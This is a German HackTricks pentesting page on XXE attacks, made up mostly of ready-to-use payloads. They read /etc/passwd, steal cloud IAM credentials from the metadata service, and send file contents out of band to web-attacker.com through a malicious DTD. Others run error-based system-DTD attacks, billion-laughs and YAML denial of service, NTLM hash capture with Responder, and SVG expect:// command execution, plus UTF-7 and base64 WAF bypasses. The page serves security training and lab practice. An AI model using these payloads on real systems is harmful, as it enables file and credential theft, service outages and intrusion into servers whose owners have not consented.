# XXE - XEE - XML External Entity

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## XML Grundlagen

XML ist eine Auszeichnungssprache, die f√ºr die Speicherung und den Transport von Daten entwickelt wurde und eine flexible Struktur aufweist, die die Verwendung von beschreibend benannten Tags erm√∂glicht. Es unterscheidet sich von HTML, da es nicht auf eine Menge vordefinierter Tags beschr√§nkt ist. Die Bedeutung von XML hat mit dem Aufkommen von JSON abgenommen, trotz seiner anf√§nglichen Rolle in der AJAX-Technologie.

* **Datenrepr√§sentation durch Entit√§ten**: Entit√§ten in XML erm√∂glichen die Darstellung von Daten, einschlie√ülich spezieller Zeichen wie `&lt;` und `&gt;`, die `<` und `>` entsprechen, um Konflikte mit dem Tag-System von XML zu vermeiden.
* **Definition von XML-Elementen**: XML erm√∂glicht die Definition von Elementtypen, die festlegen, wie Elemente strukturiert sein sollten und welchen Inhalt sie enthalten d√ºrfen, von beliebigem Inhalt bis hin zu spezifischen Kind-Elementen.
* **Dokumenttypdefinition (DTD)**: DTDs sind entscheidend in XML, um die Struktur des Dokuments und die Arten von Daten, die es enthalten kann, zu definieren. Sie k√∂nnen intern, extern oder eine Kombination sein und leiten, wie Dokumente formatiert und validiert werden.
* **Benutzerdefinierte und externe Entit√§ten**: XML unterst√ºtzt die Erstellung benutzerdefinierter Entit√§ten innerhalb einer DTD f√ºr eine flexible Datenrepr√§sentation. Externe Entit√§ten, die mit einer URL definiert sind, werfen Sicherheitsbedenken auf, insbesondere im Kontext von XML External Entity (XXE)-Angriffen, die die Art und Weise ausnutzen, wie XML-Parser externe Datenquellen behandeln: `<!DOCTYPE foo [ <!ENTITY myentity "value" > ]>`
* **XXE-Erkennung mit Parameterentit√§ten**: Zur Erkennung von XXE-Schwachstellen, insbesondere wenn herk√∂mmliche Methoden aufgrund von Sicherheitsma√ünahmen des Parsers fehlschlagen, k√∂nnen XML-Parameterentit√§ten verwendet werden. Diese Entit√§ten erm√∂glichen Out-of-Band-Erkennungstechniken, wie das Ausl√∂sen von DNS-Abfragen oder HTTP-Anfragen an eine kontrollierte Domain, um die Schwachstelle zu best√§tigen.
* `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`
* `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://attacker.com" > ]>`

## Hauptangriffe

[**Die meisten dieser Angriffe wurden mit den gro√üartigen Portswigger XEE-Labs getestet: https://portswigger.net/web-security/xxe**](https://portswigger.net/web-security/xxe)

### Neuer Entit√§tstest

In diesem Angriff werde ich testen, ob eine einfache neue ENTITY-Deklaration funktioniert.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
![](<../.gitbook/assets/image (870).png>)

### Datei lesen

Lass uns versuchen, `/etc/passwd` auf verschiedene Arten zu lesen. F√ºr Windows k√∂nntest du versuchen, zu lesen: `C:\windows\system32\drivers\etc\hosts`

In diesem ersten Fall beachte, dass SYSTEM "_\*\*file:///\*\*etc/passwd_" ebenfalls funktionieren wird.
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
![](<../.gitbook/assets/image (86).png>)

Dieser zweite Fall sollte n√ºtzlich sein, um eine Datei zu extrahieren, wenn der Webserver PHP verwendet (nicht der Fall in den Portswigger-Labs)
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
In diesem dritten Fall beachten Sie, dass wir das `Element stockCheck` als ANY deklarieren.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
![](<../.gitbook/assets/image (753).png>)

### Verzeichnisauflistung

In **Java**-basierten Anwendungen k√∂nnte es m√∂glich sein, **den Inhalt eines Verzeichnisses aufzulisten** √ºber XXE mit einem Payload wie (einfach nach dem Verzeichnis anstelle der Datei fragen):
```xml
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

Ein XXE k√∂nnte verwendet werden, um eine SSRF in einer Cloud auszunutzen.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### Blind SSRF

Mit der **vorher kommentierten Technik** kannst du den Server dazu bringen, auf einen Server zuzugreifen, den du kontrollierst, um zu zeigen, dass er anf√§llig ist. Wenn das jedoch nicht funktioniert, liegt es m√∂glicherweise daran, dass **XML-Entit√§ten nicht erlaubt sind**. In diesem Fall k√∂nntest du versuchen, **XML-Parameterentit√§ten** zu verwenden:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "Blind" SSRF - Daten au√üerhalb des Bandes exfiltrieren

**In diesem Fall werden wir den Server dazu bringen, eine neue DTD mit einer b√∂sartigen Payload zu laden, die den Inhalt einer Datei √ºber eine HTTP-Anfrage sendet (f√ºr mehrzeilige Dateien k√∂nnten Sie versuchen, sie √ºber \_ftp://**\_ zu exfiltrieren, indem Sie beispielsweise diesen einfachen Server verwenden [**xxe-ftp-server.rb**](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb)**). Diese Erkl√§rung basiert auf** [**Portswiggers-Labor hier**](https://portswigger.net/web-security/xxe/blind)**.**

In der gegebenen b√∂sartigen DTD werden eine Reihe von Schritten durchgef√ºhrt, um Daten zu exfiltrieren:

### Beispiel f√ºr eine b√∂sartige DTD:

Die Struktur ist wie folgt:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
Die Schritte, die von diesem DTD ausgef√ºhrt werden, umfassen:

1. **Definition von Parameterentit√§ten:**
* Eine XML-Parameterentit√§t, `%file`, wird erstellt, die den Inhalt der Datei `/etc/hostname` liest.
* Eine weitere XML-Parameterentit√§t, `%eval`, wird definiert. Sie erkl√§rt dynamisch eine neue XML-Parameterentit√§t, `%exfiltrate`. Die `%exfiltrate`-Entit√§t ist so eingestellt, dass sie eine HTTP-Anfrage an den Server des Angreifers sendet und den Inhalt der `%file`-Entit√§t innerhalb der Abfragezeichenfolge der URL √ºbergibt.
2. **Ausf√ºhrung der Entit√§ten:**
* Die `%eval`-Entit√§t wird verwendet, was zur Ausf√ºhrung der dynamischen Erkl√§rung der `%exfiltrate`-Entit√§t f√ºhrt.
* Die `%exfiltrate`-Entit√§t wird dann verwendet, was eine HTTP-Anfrage an die angegebene URL mit dem Inhalt der Datei ausl√∂st.

Der Angreifer hostet dieses b√∂sartige DTD auf einem Server unter seiner Kontrolle, typischerweise unter einer URL wie `http://web-attacker.com/malicious.dtd`.

**XXE Payload:** Um eine verwundbare Anwendung auszunutzen, sendet der Angreifer eine XXE-Payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
This payload definiert eine XML-Parameterentit√§t `%xxe` und integriert sie in die DTD. Wenn sie von einem XML-Parser verarbeitet wird, ruft dieses Payload die externe DTD vom Server des Angreifers ab. Der Parser interpretiert dann die DTD inline, f√ºhrt die in der b√∂sartigen DTD skizzierten Schritte aus und f√ºhrt zur Exfiltration der Datei `/etc/hostname` auf den Server des Angreifers.

### Fehlerbasiert (Externe DTD)

**In diesem Fall werden wir den Server dazu bringen, eine b√∂sartige DTD zu laden, die den Inhalt einer Datei in einer Fehlermeldung anzeigt (dies ist nur g√ºltig, wenn Sie Fehlermeldungen sehen k√∂nnen).** [**Beispiel von hier.**](https://portswigger.net/web-security/xxe/blind)

Eine XML-Parsing-Fehlermeldung, die den Inhalt der Datei `/etc/passwd` offenbart, kann durch eine b√∂sartige externe Document Type Definition (DTD) ausgel√∂st werden. Dies wird durch die folgenden Schritte erreicht:

1. Eine XML-Parameterentit√§t namens `file` wird definiert, die den Inhalt der Datei `/etc/passwd` enth√§lt.
2. Eine XML-Parameterentit√§t namens `eval` wird definiert, die eine dynamische Deklaration f√ºr eine andere XML-Parameterentit√§t namens `error` integriert. Diese `error`-Entit√§t versucht, eine nicht vorhandene Datei zu laden, wobei der Inhalt der `file`-Entit√§t als Name verwendet wird.
3. Die `eval`-Entit√§t wird aufgerufen, was zur dynamischen Deklaration der `error`-Entit√§t f√ºhrt.
4. Der Aufruf der `error`-Entit√§t f√ºhrt zu dem Versuch, eine nicht vorhandene Datei zu laden, was eine Fehlermeldung erzeugt, die den Inhalt der Datei `/etc/passwd` als Teil des Dateinamens enth√§lt.

Die b√∂sartige externe DTD kann mit dem folgenden XML aufgerufen werden:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Upon execution, die Antwort des Webservers sollte eine Fehlermeldung enthalten, die den Inhalt der Datei `/etc/passwd` anzeigt.

![](<../.gitbook/assets/image (809).png>)

_**Bitte beachten Sie, dass externe DTD es uns erm√∂glicht, eine Entit√§t innerhalb der zweiten (****`eval`****) einzuschlie√üen, dies jedoch in der internen DTD verboten ist. Daher k√∂nnen Sie normalerweise keinen Fehler erzwingen, ohne eine externe DTD zu verwenden.**_

### **Fehlerbasiert (System DTD)**

Was ist also mit blinden XXE-Schwachstellen, wenn **out-of-band Interaktionen blockiert sind** (externe Verbindungen nicht verf√ºgbar sind)?

Ein Schlupfloch in der XML-Spezifikation kann **sensible Daten durch Fehlermeldungen offenlegen, wenn die DTD eines Dokuments interne und externe Deklarationen mischt**. Dieses Problem erm√∂glicht die interne Neudefinition von extern deklarierten Entit√§ten, was die Durchf√ºhrung von fehlerbasierten XXE-Angriffen erleichtert. Solche Angriffe nutzen die Neudefinition einer XML-Parameterentit√§t aus, die urspr√ºnglich in einer externen DTD deklariert wurde, aus einer internen DTD heraus. Wenn out-of-band Verbindungen vom Server blockiert werden, m√ºssen Angreifer auf lokale DTD-Dateien zur√ºckgreifen, um den Angriff durchzuf√ºhren, mit dem Ziel, einen Parsing-Fehler zu erzeugen, um sensible Informationen offenzulegen.

Betrachten Sie ein Szenario, in dem das Dateisystem des Servers eine DTD-Datei unter `/usr/local/app/schema.dtd` enth√§lt, die eine Entit√§t namens `custom_entity` definiert. Ein Angreifer kann einen XML-Parsing-Fehler hervorrufen, der den Inhalt der Datei `/etc/passwd` offenlegt, indem er eine hybride DTD wie folgt einreicht:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
Die skizzierten Schritte werden durch diese DTD ausgef√ºhrt:

* Die Definition einer XML-Parameterentit√§t namens `local_dtd` umfasst die externe DTD-Datei, die sich im Dateisystem des Servers befindet.
* Eine Neudefinition erfolgt f√ºr die XML-Parameterentit√§t `custom_entity`, die urspr√ºnglich in der externen DTD definiert wurde, um einen [fehlerbasierten XXE-Exploit](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages) zu kapseln. Diese Neudefinition ist darauf ausgelegt, einen Parsing-Fehler auszul√∂sen, der den Inhalt der Datei `/etc/passwd` offenbart.
* Durch die Verwendung der `local_dtd`-Entit√§t wird die externe DTD aktiviert, die die neu definierte `custom_entity` umfasst. Diese Abfolge von Aktionen f√ºhrt zur Ausgabe der angestrebten Fehlermeldung des Exploits.

**Echtweltbeispiel:** Systeme, die die GNOME-Desktopumgebung verwenden, haben oft eine DTD unter `/usr/share/yelp/dtd/docbookx.dtd`, die eine Entit√§t namens `ISOamso` enth√§lt.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../.gitbook/assets/image (625).png>)

Da diese Technik eine **interne DTD verwendet, m√ºssen Sie zuerst eine g√ºltige finden**. Sie k√∂nnten dies tun, indem Sie das gleiche **Betriebssystem / die gleiche Software** installieren, die der Server verwendet, und **einige Standard-DTDs suchen**, oder **eine Liste** von **Standard-DTDs** in Systemen **abrufen** und **√ºberpr√ºfen**, ob eine von ihnen existiert:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
F√ºr weitere Informationen siehe [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)

### DTDs im System finden

In dem folgenden gro√üartigen GitHub-Repo kannst du **Pfade von DTDs finden, die im System vorhanden sein k√∂nnen**:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

Dar√ºber hinaus, wenn du das **Docker-Image des Opfersystems** hast, kannst du das Tool aus demselben Repo verwenden, um das **Image** zu **scannen** und den Pfad der **DTDs** im System zu **finden**. Lies das [Readme des GitHub](https://github.com/GoSecure/dtd-finder), um zu erfahren, wie.
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXE √ºber Office Open XML Parser

F√ºr eine detailliertere Erkl√§rung dieses Angriffs, **sehen Sie sich den zweiten Abschnitt von** [**diesem erstaunlichen Beitrag**](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/) **von Detectify an**.

Die M√∂glichkeit, **Microsoft Office-Dokumente hochzuladen, wird von vielen Webanwendungen angeboten**, die dann bestimmte Details aus diesen Dokumenten extrahieren. Zum Beispiel kann eine Webanwendung Benutzern erlauben, Daten durch das Hochladen einer XLSX-Format-Tabelle zu importieren. Damit der Parser die Daten aus der Tabelle extrahieren kann, muss er zwangsl√§ufig mindestens eine XML-Datei parsen.

Um diese Schwachstelle zu testen, ist es notwendig, eine **Microsoft Office-Datei mit einem XXE-Payload zu erstellen**. Der erste Schritt besteht darin, ein leeres Verzeichnis zu erstellen, in das das Dokument entpackt werden kann.

Sobald das Dokument entpackt wurde, sollte die XML-Datei, die sich unter `./unzipped/word/document.xml` befindet, in einem bevorzugten Texteditor (wie vim) ge√∂ffnet und bearbeitet werden. Die XML sollte so modifiziert werden, dass der gew√ºnschte XXE-Payload enthalten ist, der oft mit einer HTTP-Anfrage beginnt.

Die modifizierten XML-Zeilen sollten zwischen den beiden Wurzel-XML-Objekten eingef√ºgt werden. Es ist wichtig, die URL durch eine √ºberwachbare URL f√ºr Anfragen zu ersetzen.

Schlie√ülich kann die Datei gezippt werden, um die b√∂sartige poc.docx-Datei zu erstellen. Aus dem zuvor erstellten "unzipped"-Verzeichnis sollte der folgende Befehl ausgef√ºhrt werden:

Jetzt kann die erstellte Datei in die potenziell anf√§llige Webanwendung hochgeladen werden, und man kann hoffen, dass eine Anfrage in den Burp Collaborator-Protokollen erscheint.

### Jar: Protokoll

Das **jar**-Protokoll ist ausschlie√ülich innerhalb von **Java-Anwendungen** zug√§nglich. Es ist so konzipiert, dass es den Dateizugriff innerhalb eines **PKZIP**-Archivs (z. B. `.zip`, `.jar` usw.) erm√∂glicht, sowohl f√ºr lokale als auch f√ºr entfernte Dateien.
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
Um auf Dateien innerhalb von PKZIP-Dateien zugreifen zu k√∂nnen, ist es **super n√ºtzlich, XXE √ºber System-DTD-Dateien auszunutzen.** √úberpr√ºfen Sie [diesen Abschnitt, um zu lernen, wie man System-DTD-Dateien ausnutzt](xxe-xee-xml-external-entity.md#error-based-system-dtd).
{% endhint %}

Der Prozess, um auf eine Datei innerhalb eines PKZIP-Archivs √ºber das jar-Protokoll zuzugreifen, umfasst mehrere Schritte:

1. Eine HTTP-Anfrage wird gestellt, um das Zip-Archiv von einem bestimmten Ort herunterzuladen, wie z.B. `https://download.website.com/archive.zip`.
2. Die HTTP-Antwort, die das Archiv enth√§lt, wird vor√ºbergehend auf dem System gespeichert, typischerweise an einem Ort wie `/tmp/...`.
3. Das Archiv wird dann extrahiert, um auf seinen Inhalt zuzugreifen.
4. Die spezifische Datei im Archiv, `file.zip`, wird gelesen.
5. Nach dem Vorgang werden alle tempor√§ren Dateien, die w√§hrend dieses Prozesses erstellt wurden, gel√∂scht.

Eine interessante Technik, um diesen Prozess im zweiten Schritt zu unterbrechen, besteht darin, die Serververbindung unbegrenzt offen zu halten, w√§hrend die Archivdatei bereitgestellt wird. Tools, die in [diesem Repository](https://github.com/GoSecure/xxe-workshop/tree/master/24\_write\_xxe/solution) verf√ºgbar sind, k√∂nnen daf√ºr verwendet werden, einschlie√ülich eines Python-Servers (`slow_http_server.py`) und eines Java-Servers (`slowserver.jar`).
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">]>
<foo>&xxe;</foo>
```
{% hint style="danger" %}
Das Schreiben von Dateien in ein tempor√§res Verzeichnis kann helfen, **eine andere Schwachstelle auszunutzen, die eine Pfad Traversierung beinhaltet** (wie lokale Datei-Einbindung, Template-Injection, XSLT RCE, Deserialisierung usw.).
{% endhint %}

### XSS
```xml
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### Billion Laugh Attack
```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Yaml-Angriff
```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### Quadratic Blowup Attack

![](<../.gitbook/assets/image (527).png>)

#### NTML erhalten

Auf Windows-Hosts ist es m√∂glich, den NTML-Hash des Webserver-Benutzers zu erhalten, indem man einen Responder.py-Handler einrichtet:
```bash
Responder.py -I eth0 -v
```
und indem Sie die folgende Anfrage senden
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
Dann k√∂nnen Sie versuchen, den Hash mit hashcat zu knacken.

## Versteckte XXE-Oberfl√§chen

### XInclude

Bei der Integration von Kundendaten in serverseitige XML-Dokumente, wie sie in Backend-SOAP-Anfragen vorkommen, ist die direkte Kontrolle √ºber die XML-Struktur oft eingeschr√§nkt, was traditionelle XXE-Angriffe aufgrund von Einschr√§nkungen bei der Modifizierung des `DOCTYPE`-Elements erschwert. Ein `XInclude`-Angriff bietet jedoch eine L√∂sung, indem er die Einf√ºgung externer Entit√§ten innerhalb eines beliebigen Datenelements des XML-Dokuments erm√∂glicht. Diese Methode ist effektiv, selbst wenn nur ein Teil der Daten innerhalb eines servergenerierten XML-Dokuments kontrolliert werden kann.

Um einen `XInclude`-Angriff auszuf√ºhren, muss der `XInclude`-Namensraum deklariert und der Dateipfad f√ºr die beabsichtigte externe Entit√§t angegeben werden. Unten ist ein pr√§gnantes Beispiel, wie ein solcher Angriff formuliert werden kann:
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
Check [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) f√ºr weitere Informationen!

### SVG - Datei-Upload

Von Benutzern hochgeladene Dateien in bestimmten Anwendungen, die dann auf dem Server verarbeitet werden, k√∂nnen Schwachstellen in der Handhabung von XML oder XML-haltigen Dateiformaten ausnutzen. H√§ufige Dateiformate wie Office-Dokumente (DOCX) und Bilder (SVG) basieren auf XML.

Wenn Benutzer **Bilder hochladen**, werden diese Bilder serverseitig verarbeitet oder validiert. Selbst f√ºr Anwendungen, die Formate wie PNG oder JPEG erwarten, **kann die Bildverarbeitungsbibliothek des Servers auch SVG-Bilder unterst√ºtzen**. SVG, als XML-basiertes Format, kann von Angreifern ausgenutzt werden, um b√∂sartige SVG-Bilder einzureichen, wodurch der Server XXE (XML External Entity) -Schwachstellen ausgesetzt wird.

Ein Beispiel f√ºr einen solchen Exploit ist unten dargestellt, wo ein b√∂sartiges SVG-Bild versucht, Systemdateien zu lesen:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
Ein weiteres Verfahren besteht darin, zu versuchen, **Befehle auszuf√ºhren** √ºber den PHP "expect" Wrapper:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
In beiden F√§llen wird das SVG-Format verwendet, um Angriffe zu starten, die die XML-Verarbeitungsf√§higkeiten der Software des Servers ausnutzen, was die Notwendigkeit robuster Eingangsvalidierung und Sicherheitsma√ünahmen hervorhebt.

√úberpr√ºfen Sie [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) f√ºr weitere Informationen!

**Beachten Sie, dass die erste Zeile der gelesenen Datei oder des Ergebnisses der Ausf√ºhrung INDEM erstellten Bild erscheint. Sie m√ºssen also auf das Bild zugreifen k√∂nnen, das SVG erstellt hat.**

### **PDF - Datei-Upload**

Lesen Sie den folgenden Beitrag, um **zu lernen, wie man eine XXE beim Hochladen einer PDF-Datei ausnutzt**:

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: Von x-www-urlencoded zu XML

Wenn eine POST-Anfrage die Daten im XML-Format akzeptiert, k√∂nnten Sie versuchen, eine XXE in dieser Anfrage auszunutzen. Zum Beispiel, wenn eine normale Anfrage Folgendes enth√§lt:
```xml
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
Dann k√∂nnten Sie die folgende Anfrage mit demselben Ergebnis einreichen:
```xml
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: Von JSON zu XEE

Um die Anfrage zu √§ndern, k√∂nnten Sie eine Burp-Erweiterung namens ‚Äû**Content Type Converter**‚Äú verwenden. [Hier](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) finden Sie dieses Beispiel:
```xml
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```xml
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
Ein weiteres Beispiel finden Sie [hier](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2).

## WAF & Schutzumgehungen

### Base64
```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
This only work if the XML-Server das `data://`-Protokoll akzeptiert.

### UTF-7

You can use the \[**"Encode Recipe**" of cyberchef here ]\(\[[https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28%27UTF-7%20%2865000%29%27%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) transform to UTF-7.
```xml
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### File:/ Protokoll Umgehung

